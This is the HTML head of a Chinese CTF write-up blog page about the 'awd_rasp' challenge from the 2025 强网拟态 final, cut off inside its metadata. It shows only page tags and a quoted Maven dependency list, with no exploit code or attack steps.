<!DOCTYPE html>
<html lang="zh" dir="auto" data-theme="dark">

<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>强网拟态2025决赛awd_rasp复现 | Xrntkk&#39;s Blog</title>
<meta name="keywords" content="writeup, ctf, Web, Javasec, Java">
<meta name="description" content="这是一个含有非常多危险依赖的题，如下：
  1 &lt;dependencies&gt;
  2
  3        &lt;!-- AOP / Aspect --&gt;
  4        &lt;dependency&gt;
  5            &lt;groupId&gt;org.glassfish.hk2.external&lt;/groupId&gt;
  6            &lt;artifactId&gt;aopalliance-repackaged&lt;/artifactId&gt;
  7            &lt;version&gt;2.6.1&lt;/version&gt;
  8        &lt;/dependency&gt;
  9
 10        &lt;dependency&gt;
 11            &lt;groupId&gt;org.aspectj&lt;/groupId&gt;
 12            &lt;artifactId&gt;aspectjweaver&lt;/artifactId&gt;
 13            &lt;version&gt;1.9.2&lt;/version&gt;
 14        &lt;/dependency&gt;
 15
 16        &lt;!-- Oracle Coherence --&gt;
 17        &lt;dependency&gt;
 18            &lt;groupId&gt;com.oracle.coherence.ce&lt;/groupId&gt;
 19            &lt;artifactId&gt;coherence&lt;/artifactId&gt;
 20            &lt;version&gt;14.1.1-0-3&lt;/version&gt;
 21        &lt;/dependency&gt;
 22
 23        &lt;dependency&gt;
 24            &lt;groupId&gt;com.oracle.coherence.ce&lt;/groupId&gt;
 25            &lt;artifactId&gt;coherence-rest&lt;/artifactId&gt;
 26            &lt;version&gt;14.1.1-0-3&lt;/version&gt;
 27        &lt;/dependency&gt;
 28
 29        &lt;!-- Commons --&gt;
 30        &lt;dependency&gt;
 31            &lt;groupId&gt;commons-beanutils&lt;/groupId&gt;
 32            &lt;artifactId&gt;commons-beanutils&lt;/artifactId&gt;
 33            &lt;version&gt;1.9.2&lt;/version&gt;
 34        &lt;/dependency&gt;
 35
 36        &lt;dependency&gt;
 37            &lt;groupId&gt;commons-collections&lt;/groupId&gt;
 38            &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;
 39            &lt;version&gt;3.2.1&lt;/version&gt;
 40        &lt;/dependency&gt;
 41
 42        &lt;dependency&gt;
 43            &lt;groupId&gt;org.apache.commons&lt;/groupId&gt;
 44            &lt;artifactId&gt;commons-collections4&lt;/artifactId&gt;
 45            &lt;version&gt;4.0&lt;/version&gt;
 46        &lt;/dependency&gt;
 47
 48        &lt;dependency&gt;
 49            &lt;groupId&gt;commons-logging&lt;/groupId&gt;
 50            &lt;artifactId&gt;commons-logging&lt;/artifactId&gt;
 51            &lt;version&gt;1.2&lt;/version&gt;
 52        &lt;/dependency&gt;
 53
 54        &lt;!-- Groovy --&gt;
 55        &lt;dependency&gt;
 56            &lt;groupId&gt;org.codehaus.groovy&lt;/groupId&gt;
 57            &lt;artifactId&gt;groovy&lt;/artifactId&gt;
 58            &lt;version&gt;2.3.9&lt;/version&gt;
 59        &lt;/dependency&gt;
 60
 61        &lt;!-- HK2 --&gt;
 62        &lt;dependency&gt;
 63            &lt;groupId&gt;org.glassfish.hk2&lt;/groupId&gt;
 64            &lt;artifactId&gt;hk2-api&lt;/artifactId&gt;
 65            &lt;version&gt;2.6.1&lt;/version&gt;
 66        &lt;/dependency&gt;
 67
 68        &lt;dependency&gt;
 69            &lt;groupId&gt;org.glassfish.hk2&lt;/groupId&gt;
 70            &lt;artifactId&gt;hk2-locator&lt;/artifactId&gt;
 71            &lt;version&gt;2.6.1&lt;/version&gt;
 72        &lt;/dependency&gt;
 73
 74        &lt;dependency&gt;
 75            &lt;groupId&gt;org.glassfish.hk2&lt;/groupId&gt;
 76            &lt;artifactId&gt;hk2-utils&lt;/artifactId&gt;
 77            &lt;version&gt;2.6.1&lt;/version&gt;
 78        &lt;/dependency&gt;
 79
 80        &lt;!-- Jackson --&gt;
 81        &lt;dependency&gt;
 82            &lt;groupId&gt;com.fasterxml.jackson.core&lt;/groupId&gt;
 83            &lt;artifactId&gt;jackson-annotations&lt;/artifactId&gt;
 84            &lt;version&gt;2.13.4&lt;/version&gt;
 85        &lt;/dependency&gt;
 86
 87        &lt;dependency&gt;
 88            &lt;groupId&gt;com.fasterxml.jackson.core&lt;/groupId&gt;
 89            &lt;artifactId&gt;jackson-core&lt;/artifactId&gt;
 90            &lt;version&gt;2.13.4&lt;/version&gt;
 91        &lt;/dependency&gt;
 92
 93        &lt;dependency&gt;
 94            &lt;groupId&gt;com.fasterxml.jackson.core&lt;/groupId&gt;
 95            &lt;artifactId&gt;jackson-databind&lt;/artifactId&gt;
 96            &lt;version&gt;2.13.4.2&lt;/version&gt;
 97        &lt;/dependency&gt;
 98
 99        &lt;dependency&gt;
100            &lt;groupId&gt;com.fasterxml.jackson.datatype&lt;/groupId&gt;
101            &lt;artifactId&gt;jackson-datatype-jdk8&lt;/artifactId&gt;
102            &lt;version&gt;2.13.4&lt;/version&gt;
103        &lt;/dependency&gt;
104
105        &lt;dependency&gt;
106            &lt;groupId&gt;com.fasterxml.jackson.datatype&lt;/groupId&gt;
107            &lt;artifactId&gt;jackson-datatype-jsr310&lt;/artifactId&gt;
108            &lt;version&gt;2.13.4&lt;/version&gt;
109        &lt;/dependency&gt;
110
111        &lt;dependency&gt;
112            &lt;groupId&gt;com.fasterxml.jackson.jaxrs&lt;/groupId&gt;
113            &lt;artifactId&gt;jackson-jaxrs-base&lt;/artifactId&gt;
114            &lt;version&gt;2.13.4&lt;/version&gt;
115        &lt;/dependency&gt;
116
117        &lt;dependency&gt;
118            &lt;groupId&gt;com.fasterxml.jackson.jaxrs&lt;/groupId&gt;
119            &lt;artifactId&gt;jackson-jaxrs-json-provider&lt;/artifactId&gt;
120            &lt;version&gt;2.13.4&lt;/version&gt;
121        &lt;/dependency&gt;
122
123        &lt;dependency&gt;
124            &lt;groupId&gt;com.fasterxml.jackson.module&lt;/groupId&gt;
125            &lt;artifactId&gt;jackson-module-jaxb-annotations&lt;/artifactId&gt;
126            &lt;version&gt;2.13.4&lt;/version&gt;
127        &lt;/dependency&gt;
128
129        &lt;dependency&gt;
130            &lt;groupId&gt;com.fasterxml.jackson.module&lt;/groupId&gt;
131            &lt;artifactId&gt;jackson-module-parameter-names&lt;/artifactId&gt;
132            &lt;version&gt;2.13.4&lt;/version&gt;
133        &lt;/dependency&gt;
134
135        &lt;!-- Jakarta --&gt;
136        &lt;dependency&gt;
137            &lt;groupId&gt;jakarta.activation&lt;/groupId&gt;
138            &lt;artifactId&gt;jakarta.activation-api&lt;/artifactId&gt;
139            &lt;version&gt;1.2.2&lt;/version&gt;
140        &lt;/dependency&gt;
141
142        &lt;dependency&gt;
143            &lt;groupId&gt;jakarta.annotation&lt;/groupId&gt;
144            &lt;artifactId&gt;jakarta.annotation-api&lt;/artifactId&gt;
145            &lt;version&gt;1.3.5&lt;/version&gt;
146        &lt;/dependency&gt;
147
148        &lt;dependency&gt;
149            &lt;groupId&gt;jakarta.validation&lt;/groupId&gt;
150            &lt;artifactId&gt;jakarta.validation-api&lt;/artifactId&gt;
151            &lt;version&gt;2.0.2&lt;/version&gt;
152        &lt;/dependency&gt;
153
154        &lt;dependency&gt;
155            &lt;groupId&gt;jakarta.ws.rs&lt;/groupId&gt;
156            &lt;artifactId&gt;jakarta.ws.rs-api&lt;/artifactId&gt;
157            &lt;version&gt;2.1.6&lt;/version&gt;
158        &lt;/dependency&gt;
159
160        &lt;dependency&gt;
161            &lt;groupId&gt;jakarta.xml.bind&lt;/groupId&gt;
162            &lt;artifactId&gt;jakarta.xml.bind-api&lt;/artifactId&gt;
163            &lt;version&gt;2.3.3&lt;/version&gt;
164        &lt;/dependency&gt;
165
166        &lt;!-- Javassist --&gt;
167        &lt;dependency&gt;
168            &lt;groupId&gt;org.javassist&lt;/groupId&gt;
169            &lt;artifactId&gt;javassist&lt;/artifactId&gt;
170            &lt;version&gt;3.25.0-GA&lt;/version&gt;
171        &lt;/dependency&gt;
172
173        &lt;!-- Jersey --&gt;
174        &lt;dependency&gt;
175            &lt;groupId&gt;org.glassfish.jersey.core&lt;/groupId&gt;
176            &lt;artifactId&gt;jersey-client&lt;/artifactId&gt;
177            &lt;version&gt;2.35&lt;/version&gt;
178        &lt;/dependency&gt;
179
180        &lt;dependency&gt;
181            &lt;groupId&gt;org.glassfish.jersey.core&lt;/groupId&gt;
182            &lt;artifactId&gt;jersey-common&lt;/artifactId&gt;
183            &lt;version&gt;2.35&lt;/version&gt;
184        &lt;/dependency&gt;
185
186        &lt;dependency&gt;
187            &lt;groupId&gt;org.glassfish.jersey.containers&lt;/groupId&gt;
188            &lt;artifactId&gt;jersey-container-jdk-http&lt;/artifactId&gt;
189            &lt;version&gt;2.35&lt;/version&gt;
190        &lt;/dependency&gt;
191
192        &lt;dependency&gt;
193            &lt;groupId&gt;org.glassfish.jersey.containers&lt;/groupId&gt;
194            &lt;artifactId&gt;jersey-container-servlet&lt;/artifactId&gt;
195            &lt;version&gt;2.35&lt;/version&gt;
196        &lt;/dependency&gt;
197
198        &lt;dependency&gt;
199            &lt;groupId&gt;org.glassfish.jersey.containers&lt;/groupId&gt;
200            &lt;artifactId&gt;jersey-container-servlet-core&lt;/artifactId&gt;
201            &lt;version&gt;2.35&lt;/version&gt;
202        &lt;/dependency&gt;
203
204        &lt;dependency&gt;
205            &lt;groupId&gt;org.glassfish.jersey.ext&lt;/groupId&gt;
206            &lt;artifactId&gt;jersey-entity-filtering&lt;/artifactId&gt;
207            &lt;version&gt;2.35&lt;/version&gt;
208        &lt;/dependency&gt;
209
210        &lt;dependency&gt;
211            &lt;groupId&gt;org.glassfish.jersey.inject&lt;/groupId&gt;
212            &lt;artifactId&gt;jersey-hk2&lt;/artifactId&gt;
213            &lt;version&gt;2.35&lt;/version&gt;
214        &lt;/dependency&gt;
215
216        &lt;dependency&gt;
217            &lt;groupId&gt;org.glassfish.jersey.media&lt;/groupId&gt;
218            &lt;artifactId&gt;jersey-media-json-jackson&lt;/artifactId&gt;
219            &lt;version&gt;2.35&lt;/version&gt;
220        &lt;/dependency&gt;
221
222        &lt;dependency&gt;
223            &lt;groupId&gt;org.glassfish.jersey.media&lt;/groupId&gt;
224            &lt;artifactId&gt;jersey-media-sse&lt;/artifactId&gt;
225            &lt;version&gt;2.35&lt;/version&gt;
226        &lt;/dependency&gt;
227
228        &lt;dependency&gt;
229            &lt;groupId&gt;org.glassfish.jersey.core&lt;/groupId&gt;
230            &lt;artifactId&gt;jersey-server&lt;/artifactId&gt;
231            &lt;version&gt;2.35&lt;/version&gt;
232        &lt;/dependency&gt;
233
234        &lt;!-- JTA --&gt;
235        &lt;dependency&gt;
236            &lt;groupId&gt;javax.transaction&lt;/groupId&gt;
237            &lt;artifactId&gt;jta&lt;/artifactId&gt;
238            &lt;version&gt;1.1&lt;/version&gt;
239        &lt;/dependency&gt;
240
241        &lt;!-- Logging --&gt;
242        &lt;dependency&gt;
243            &lt;groupId&gt;org.slf4j&lt;/groupId&gt;
244            &lt;artifactId&gt;jul-to-slf4j&lt;/artifactId&gt;
245            &lt;version&gt;1.7.36&lt;/version&gt;
246        &lt;/dependency&gt;
247
248        &lt;dependency&gt;
249            &lt;groupId&gt;org.slf4j&lt;/groupId&gt;
250            &lt;artifactId&gt;slf4j-api&lt;/artifactId&gt;
251            &lt;version&gt;1.7.36&lt;/version&gt;
252        &lt;/dependency&gt;
253
254        &lt;dependency&gt;
255            &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;
256            &lt;artifactId&gt;log4j-api&lt;/artifactId&gt;
257            &lt;version&gt;2.17.2&lt;/version&gt;
258        &lt;/dependency&gt;
259
260        &lt;dependency&gt;
261            &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;
262            &lt;artifactId&gt;log4j-to-slf4j&lt;/artifactId&gt;
263            &lt;version&gt;2.17.2&lt;/version&gt;
264        &lt;/dependency&gt;
265
266        &lt;dependency&gt;
267            &lt;groupId&gt;ch.qos.logback&lt;/groupId&gt;
268            &lt;artifactId&gt;logback-classic&lt;/artifactId&gt;
269            &lt;version&gt;1.2.11&lt;/version&gt;
270        &lt;/dependency&gt;
271
272        &lt;dependency&gt;
273            &lt;groupId&gt;ch.qos.logback&lt;/groupId&gt;
274            &lt;artifactId&gt;logback-core&lt;/artifactId&gt;
275            &lt;version&gt;1.2.11&lt;/version&gt;
276        &lt;/dependency&gt;
277
278        &lt;!-- OSGI --&gt;
279        &lt;dependency&gt;
280            &lt;groupId&gt;org.glassfish.hk2&lt;/groupId&gt;
281            &lt;artifactId&gt;osgi-resource-locator&lt;/artifactId&gt;
282            &lt;version&gt;1.0.3&lt;/version&gt;
283        &lt;/dependency&gt;
284
285        &lt;!-- SnakeYAML --&gt;
286        &lt;dependency&gt;
287            &lt;groupId&gt;org.yaml&lt;/groupId&gt;
288            &lt;artifactId&gt;snakeyaml&lt;/artifactId&gt;
289            &lt;version&gt;1.29&lt;/version&gt;
290        &lt;/dependency&gt;
291
292        &lt;!-- Spring Framework --&gt;
293        &lt;dependency&gt;
294            &lt;groupId&gt;org.springframework&lt;/groupId&gt;
295            &lt;artifactId&gt;spring-aop&lt;/artifactId&gt;
296            &lt;version&gt;5.3.23&lt;/version&gt;
297        &lt;/dependency&gt;
298
299        &lt;dependency&gt;
300            &lt;groupId&gt;org.springframework&lt;/groupId&gt;
301            &lt;artifactId&gt;spring-beans&lt;/artifactId&gt;
302            &lt;version&gt;5.3.23&lt;/version&gt;
303        &lt;/dependency&gt;
304
305        &lt;dependency&gt;
306            &lt;groupId&gt;org.springframework&lt;/groupId&gt;
307            &lt;artifactId&gt;spring-context&lt;/artifactId&gt;
308            &lt;version&gt;5.3.23&lt;/version&gt;
309        &lt;/dependency&gt;
310
311        &lt;dependency&gt;
312            &lt;groupId&gt;org.springframework&lt;/groupId&gt;
313            &lt;artifactId&gt;spring-core&lt;/artifactId&gt;
314            &lt;version&gt;5.3.23&lt;/version&gt;
315        &lt;/dependency&gt;
316
317        &lt;dependency&gt;
318            &lt;groupId&gt;org.springframework&lt;/groupId&gt;
319            &lt;artifactId&gt;spring-expression&lt;/artifactId&gt;
320            &lt;version&gt;5.3.23&lt;/version&gt;
321        &lt;/dependency&gt;
322
323        &lt;dependency&gt;
324            &lt;groupId&gt;org.springframework&lt;/groupId&gt;
325            &lt;artifactId&gt;spring-jcl&lt;/artifactId&gt;
326            &lt;version&gt;5.3.23&lt;/version&gt;
327        &lt;/dependency&gt;
328
329        &lt;dependency&gt;
330            &lt;groupId&gt;org.springframework&lt;/groupId&gt;
331            &lt;artifactId&gt;spring-web&lt;/artifactId&gt;
332            &lt;version&gt;5.3.23&lt;/version&gt;
333        &lt;/dependency&gt;
334
335        &lt;dependency&gt;
336            &lt;groupId&gt;org.springframework&lt;/groupId&gt;
337            &lt;artifactId&gt;spring-webmvc&lt;/artifactId&gt;
338            &lt;version&gt;5.3.23&lt;/version&gt;
339        &lt;/dependency&gt;
340
341        &lt;dependency&gt;
342            &lt;groupId&gt;org.springframework&lt;/groupId&gt;
343            &lt;artifactId&gt;spring-tx&lt;/artifactId&gt;
344            &lt;version&gt;5.3.30&lt;/version&gt;
345        &lt;/dependency&gt;
346
347        &lt;!-- Spring Boot --&gt;
348        &lt;dependency&gt;
349            &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
350            &lt;artifactId&gt;spring-boot&lt;/artifactId&gt;
351            &lt;version&gt;2.6.13&lt;/version&gt;
352        &lt;/dependency&gt;
353
354        &lt;dependency&gt;
355            &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
356            &lt;artifactId&gt;spring-boot-autoconfigure&lt;/artifactId&gt;
357            &lt;version&gt;2.6.13&lt;/version&gt;
358        &lt;/dependency&gt;
359
360        &lt;dependency&gt;
361            &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
362            &lt;artifactId&gt;spring-boot-jarmode-layertools&lt;/artifactId&gt;
363            &lt;version&gt;2.6.13&lt;/version&gt;
364        &lt;/dependency&gt;
365
366        &lt;!-- Tomcat --&gt;
367        &lt;dependency&gt;
368            &lt;groupId&gt;org.apache.tomcat.embed&lt;/groupId&gt;
369            &lt;artifactId&gt;tomcat-embed-core&lt;/artifactId&gt;
370            &lt;version&gt;9.0.68&lt;/version&gt;
371        &lt;/dependency&gt;
372
373        &lt;dependency&gt;
374            &lt;groupId&gt;org.apache.tomcat.embed&lt;/groupId&gt;
375            &lt;artifactId&gt;tomcat-embed-el&lt;/artifactId&gt;
376            &lt;version&gt;9.0.68&lt;/version&gt;
377        &lt;/dependency&gt;
378
379        &lt;dependency&gt;
380            &lt;groupId&gt;org.apache.tomcat.embed&lt;/groupId&gt;
381            &lt;artifactId&gt;tomcat-embed-websocket&lt;/artifactId&gt;
382            &lt;version&gt;9.0.68&lt;/version&gt;
383        &lt;/dependency&gt;
相对的waf也非常长，分别是在resolveClass中的Waf和在Rasp中的waf">
<meta name="author" content="Xrntkk">
<link rel="canonical" href="http://localhost:1313/post/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%812025%E5%86%B3%E8%B5%9B/">

<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
  <meta name="referrer" content="no-referrer-when-downgrade">
<link crossorigin="anonymous" href="/assets/css/stylesheet.317863601f03c2b94974bf53f8aaac583e7d21f7d74106e5602576c147c6f679.css" integrity="sha256-MXhjYB8DwrlJdL9T&#43;KqsWD59IffXQQblYCV2wUfG9nk=" rel="preload stylesheet" as="style">
<link rel="icon" href="http://localhost:1313/favicon.ico">
<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
<link rel="apple-touch-icon" href="http://localhost:1313/apple-touch-icon.png">
<link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<link rel="alternate" hreflang="zh" href="http://localhost:1313/post/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%812025%E5%86%B3%E8%B5%9B/">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
</noscript><link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:ital,wght@0,100..800;1,100..800&display=swap" rel="stylesheet">
<meta name="baidu-site-verification" content="codeva-snmPZ4WZk8" /><meta property="og:url" content="http://localhost:1313/post/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%812025%E5%86%B3%E8%B5%9B/">
  <meta property="og:site_name" content="Xrntkk&#39;s Blog">
  <meta property="og:title" content="强网拟态2025决赛awd_rasp复现">
  <meta property="og:description" content="这是一个含有非常多危险依赖的题，如下：
1 &lt;dependencies&gt; 2 3 &lt;!-- AOP / Aspect --&gt; 4 &lt;dependency&gt; 5 &lt;groupId&gt;org.glassfish.hk2.external&lt;/groupId&gt; 6 &lt;artifactId&gt;aopalliance-repackaged&lt;/artifactId&gt; 7 &lt;version&gt;2.6.1&lt;/version&gt; 8 &lt;/dependency&gt; 9 10 &lt;dependency&gt; 11 &lt;groupId&gt;org.aspectj&lt;/groupId&gt; 12 &lt;artifactId&gt;aspectjweaver&lt;/artifactId&gt; 13 &lt;version&gt;1.9.2&lt;/version&gt; 14 &lt;/dependency&gt; 15 16 &lt;!-- Oracle Coherence --&gt; 17 &lt;dependency&gt; 18 &lt;groupId&gt;com.oracle.coherence.ce&lt;/groupId&gt; 19 &lt;artifactId&gt;coherence&lt;/artifactId&gt; 20 &lt;version&gt;14.1.1-0-3&lt;/version&gt; 21 &lt;/dependency&gt; 22 23 &lt;dependency&gt; 24 &lt;groupId&gt;com.oracle.coherence.ce&lt;/groupId&gt; 25 &lt;artifactId&gt;coherence-rest&lt;/artifactId&gt; 26 &lt;version&gt;14.1.1-0-3&lt;/version&gt; 27 &lt;/dependency&gt; 28 29 &lt;!-- Commons --&gt; 30 &lt;dependency&gt; 31 &lt;groupId&gt;commons-beanutils&lt;/groupId&gt; 32 &lt;artifactId&gt;commons-beanutils&lt;/artifactId&gt; 33 &lt;version&gt;1.9.2&lt;/version&gt; 34 &lt;/dependency&gt; 35 36 &lt;dependency&gt; 37 &lt;groupId&gt;commons-collections&lt;/groupId&gt; 38 &lt;artifactId&gt;commons-collections&lt;/artifactId&gt; 39 &lt;version&gt;3.2.1&lt;/version&gt; 40 &lt;/dependency&gt; 41 42 &lt;dependency&gt; 43 &lt;groupId&gt;org.apache.commons&lt;/groupId&gt; 44 &lt;artifactId&gt;commons-collections4&lt;/artifactId&gt; 45 &lt;version&gt;4.0&lt;/version&gt; 46 &lt;/dependency&gt; 47 48 &lt;dependency&gt; 49 &lt;groupId&gt;commons-logging&lt;/groupId&gt; 50 &lt;artifactId&gt;commons-logging&lt;/artifactId&gt; 51 &lt;version&gt;1.2&lt;/version&gt; 52 &lt;/dependency&gt; 53 54 &lt;!-- Groovy --&gt; 55 &lt;dependency&gt; 56 &lt;groupId&gt;org.codehaus.groovy&lt;/groupId&gt; 57 &lt;artifactId&gt;groovy&lt;/artifactId&gt; 58 &lt;version&gt;2.3.9&lt;/version&gt; 59 &lt;/dependency&gt; 60 61 &lt;!-- HK2 --&gt; 62 &lt;dependency&gt; 63 &lt;groupId&gt;org.glassfish.hk2&lt;/groupId&gt; 64 &lt;artifactId&gt;hk2-api&lt;/artifactId&gt; 65 &lt;version&gt;2.6.1&lt;/version&gt; 66 &lt;/dependency&gt; 67 68 &lt;dependency&gt; 69 &lt;groupId&gt;org.glassfish.hk2&lt;/groupId&gt; 70 &lt;artifactId&gt;hk2-locator&lt;/artifactId&gt; 71 &lt;version&gt;2.6.1&lt;/version&gt; 72 &lt;/dependency&gt; 73 74 &lt;dependency&gt; 75 &lt;groupId&gt;org.glassfish.hk2&lt;/groupId&gt; 76 &lt;artifactId&gt;hk2-utils&lt;/artifactId&gt; 77 &lt;version&gt;2.6.1&lt;/version&gt; 78 &lt;/dependency&gt; 79 80 &lt;!-- Jackson --&gt; 81 &lt;dependency&gt; 82 &lt;groupId&gt;com.fasterxml.jackson.core&lt;/groupId&gt; 83 &lt;artifactId&gt;jackson-annotations&lt;/artifactId&gt; 84 &lt;version&gt;2.13.4&lt;/version&gt; 85 &lt;/dependency&gt; 86 87 &lt;dependency&gt; 88 &lt;groupId&gt;com.fasterxml.jackson.core&lt;/groupId&gt; 89 &lt;artifactId&gt;jackson-core&lt;/artifactId&gt; 90 &lt;version&gt;2.13.4&lt;/version&gt; 91 &lt;/dependency&gt; 92 93 &lt;dependency&gt; 94 &lt;groupId&gt;com.fasterxml.jackson.core&lt;/groupId&gt; 95 &lt;artifactId&gt;jackson-databind&lt;/artifactId&gt; 96 &lt;version&gt;2.13.4.2&lt;/version&gt; 97 &lt;/dependency&gt; 98 99 &lt;dependency&gt; 100 &lt;groupId&gt;com.fasterxml.jackson.datatype&lt;/groupId&gt; 101 &lt;artifactId&gt;jackson-datatype-jdk8&lt;/artifactId&gt; 102 &lt;version&gt;2.13.4&lt;/version&gt; 103 &lt;/dependency&gt; 104 105 &lt;dependency&gt; 106 &lt;groupId&gt;com.fasterxml.jackson.datatype&lt;/groupId&gt; 107 &lt;artifactId&gt;jackson-datatype-jsr310&lt;/artifactId&gt; 108 &lt;version&gt;2.13.4&lt;/version&gt; 109 &lt;/dependency&gt; 110 111 &lt;dependency&gt; 112 &lt;groupId&gt;com.fasterxml.jackson.jaxrs&lt;/groupId&gt; 113 &lt;artifactId&gt;jackson-jaxrs-base&lt;/artifactId&gt; 114 &lt;version&gt;2.13.4&lt;/version&gt; 115 &lt;/dependency&gt; 116 117 &lt;dependency&gt; 118 &lt;groupId&gt;com.fasterxml.jackson.jaxrs&lt;/groupId&gt; 119 &lt;artifactId&gt;jackson-jaxrs-json-provider&lt;/artifactId&gt; 120 &lt;version&gt;2.13.4&lt;/version&gt; 121 &lt;/dependency&gt; 122 123 &lt;dependency&gt; 124 &lt;groupId&gt;com.fasterxml.jackson.module&lt;/groupId&gt; 125 &lt;artifactId&gt;jackson-module-jaxb-annotations&lt;/artifactId&gt; 126 &lt;version&gt;2.13.4&lt;/version&gt; 127 &lt;/dependency&gt; 128 129 &lt;dependency&gt; 130 &lt;groupId&gt;com.fasterxml.jackson.module&lt;/groupId&gt; 131 &lt;artifactId&gt;jackson-module-parameter-names&lt;/artifactId&gt; 132 &lt;version&gt;2.13.4&lt;/version&gt; 133 &lt;/dependency&gt; 134 135 &lt;!-- Jakarta --&gt; 136 &lt;dependency&gt; 137 &lt;groupId&gt;jakarta.activation&lt;/groupId&gt; 138 &lt;artifactId&gt;jakarta.activation-api&lt;/artifactId&gt; 139 &lt;version&gt;1.2.2&lt;/version&gt; 140 &lt;/dependency&gt; 141 142 &lt;dependency&gt; 143 &lt;groupId&gt;jakarta.annotation&lt;/groupId&gt; 144 &lt;artifactId&gt;jakarta.annotation-api&lt;/artifactId&gt; 145 &lt;version&gt;1.3.5&lt;/version&gt; 146 &lt;/dependency&gt; 147 148 &lt;dependency&gt; 149 &lt;groupId&gt;jakarta.validation&lt;/groupId&gt; 150 &lt;artifactId&gt;jakarta.validation-api&lt;/artifactId&gt; 151 &lt;version&gt;2.0.2&lt;/version&gt; 152 &lt;/dependency&gt; 153 154 &lt;dependency&gt; 155 &lt;groupId&gt;jakarta.ws.rs&lt;/groupId&gt; 156 &lt;artifactId&gt;jakarta.ws.rs-api&lt;/artifactId&gt; 157 &lt;version&gt;2.1.6&lt;/version&gt; 158 &lt;/dependency&gt; 159 160 &lt;dependency&gt; 161 &lt;groupId&gt;jakarta.xml.bind&lt;/groupId&gt; 162 &lt;artifactId&gt;jakarta.xml.bind-api&lt;/artifactId&gt; 163 &lt;version&gt;2.3.3&lt;/version&gt; 164 &lt;/dependency&gt; 165 166 &lt;!-- Javassist --&gt; 167 &lt;dependency&gt; 168 &lt;groupId&gt;org.javassist&lt;/groupId&gt; 169 &lt;artifactId&gt;javassist&lt;/artifactId&gt; 170 &lt;version&gt;3.25.0-GA&lt;/version&gt; 171 &lt;/dependency&gt; 172 173 &lt;!-- Jersey --&gt; 174 &lt;dependency&gt; 175 &lt;groupId&gt;org.glassfish.jersey.core&lt;/groupId&gt; 176 &lt;artifactId&gt;jersey-client&lt;/artifactId&gt; 177 &lt;version&gt;2.35&lt;/version&gt; 178 &lt;/dependency&gt; 179 180 &lt;dependency&gt; 181 &lt;groupId&gt;org.glassfish.jersey.core&lt;/groupId&gt; 182 &lt;artifactId&gt;jersey-common&lt;/artifactId&gt; 183 &lt;version&gt;2.35&lt;/version&gt; 184 &lt;/dependency&gt; 185 186 &lt;dependency&gt; 187 &lt;groupId&gt;org.glassfish.jersey.containers&lt;/groupId&gt; 188 &lt;artifactId&gt;jersey-container-jdk-http&lt;/artifactId&gt; 189 &lt;version&gt;2.35&lt;/version&gt; 190 &lt;/dependency&gt; 191 192 &lt;dependency&gt; 193 &lt;groupId&gt;org.glassfish.jersey.containers&lt;/groupId&gt; 194 &lt;artifactId&gt;jersey-container-servlet&lt;/artifactId&gt; 195 &lt;version&gt;2.35&lt;/version&gt; 196 &lt;/dependency&gt; 197 198 &lt;dependency&gt; 199 &lt;groupId&gt;org.glassfish.jersey.containers&lt;/groupId&gt; 200 &lt;artifactId&gt;jersey-container-servlet-core&lt;/artifactId&gt; 201 &lt;version&gt;2.35&lt;/version&gt; 202 &lt;/dependency&gt; 203 204 &lt;dependency&gt; 205 &lt;groupId&gt;org.glassfish.jersey.ext&lt;/groupId&gt; 206 &lt;artifactId&gt;jersey-entity-filtering&lt;/artifactId&gt; 207 &lt;version&gt;2.35&lt;/version&gt; 208 &lt;/dependency&gt; 209 210 &lt;dependency&gt; 211 &lt;groupId&gt;org.glassfish.jersey.inject&lt;/groupId&gt; 212 &lt;artifactId&gt;jersey-hk2&lt;/artifactId&gt; 213 &lt;version&gt;2.35&lt;/version&gt; 214 &lt;/dependency&gt; 215 216 &lt;dependency&gt; 217 &lt;groupId&gt;org.glassfish.jersey.media&lt;/groupId&gt; 218 &lt;artifactId&gt;jersey-media-json-jackson&lt;/artifactId&gt; 219 &lt;version&gt;2.35&lt;/version&gt; 220 &lt;/dependency&gt; 221 222 &lt;dependency&gt; 223 &lt;groupId&gt;org.glassfish.jersey.media&lt;/groupId&gt; 224 &lt;artifactId&gt;jersey-media-sse&lt;/artifactId&gt; 225 &lt;version&gt;2.35&lt;/version&gt; 226 &lt;/dependency&gt; 227 228 &lt;dependency&gt; 229 &lt;groupId&gt;org.glassfish.jersey.core&lt;/groupId&gt; 230 &lt;artifactId&gt;jersey-server&lt;/artifactId&gt; 231 &lt;version&gt;2.35&lt;/version&gt; 232 &lt;/dependency&gt; 233 234 &lt;!-- JTA --&gt; 235 &lt;dependency&gt; 236 &lt;groupId&gt;javax.transaction&lt;/groupId&gt; 237 &lt;artifactId&gt;jta&lt;/artifactId&gt; 238 &lt;version&gt;1.1&lt;/version&gt; 239 &lt;/dependency&gt; 240 241 &lt;!-- Logging --&gt; 242 &lt;dependency&gt; 243 &lt;groupId&gt;org.slf4j&lt;/groupId&gt; 244 &lt;artifactId&gt;jul-to-slf4j&lt;/artifactId&gt; 245 &lt;version&gt;1.7.36&lt;/version&gt; 246 &lt;/dependency&gt; 247 248 &lt;dependency&gt; 249 &lt;groupId&gt;org.slf4j&lt;/groupId&gt; 250 &lt;artifactId&gt;slf4j-api&lt;/artifactId&gt; 251 